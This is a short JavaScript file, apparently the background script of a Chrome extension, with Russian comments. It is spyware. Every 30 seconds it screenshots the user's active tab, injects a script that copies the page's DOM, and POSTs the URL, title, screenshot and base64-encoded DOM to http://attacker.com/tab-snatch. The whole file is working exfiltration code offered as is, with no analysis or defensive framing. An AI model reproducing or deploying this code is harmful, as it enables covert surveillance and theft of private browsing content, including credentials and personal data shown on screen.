const POST_URL = "http://attacker.com/tab-snatch";

// Основная функция — работает только на активной вкладке
function snatchCurrentTab() {
    chrome.tabs.query({active: true, lastFocusedWindow: true}, (tabs) => {
        if (!tabs.length) return;
        const tab = tabs[0];

        chrome.tabs.captureVisibleTab(tab.windowId, {format: "png"}, (screenshotDataUrl) => {
            chrome.scripting.executeScript({
                target: {tabId: tab.id},
                files: ["dom-snatcher.js"]
            });

            chrome.runtime.onMessage.addListener(function handler(msg, sender) {
                if (msg && msg.type === "tab-snatch-dom" && sender.tab && sender.tab.id === tab.id) {
                    chrome.runtime.onMessage.removeListener(handler);

                    fetch(POST_URL, {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            url: tab.url,
                            title: tab.title,
                            screenshot: screenshotDataUrl,
                            dom_b64: msg.dom_b64  // base64 DOM!
                        })
                    });
                }
            });
        });
    });
}

// Стартуем таймер раз в 30 секунд
setInterval(snatchCurrentTab, 30000);

// Можно сразу отправить первый раз при запуске (опционально)
snatchCurrentTab();
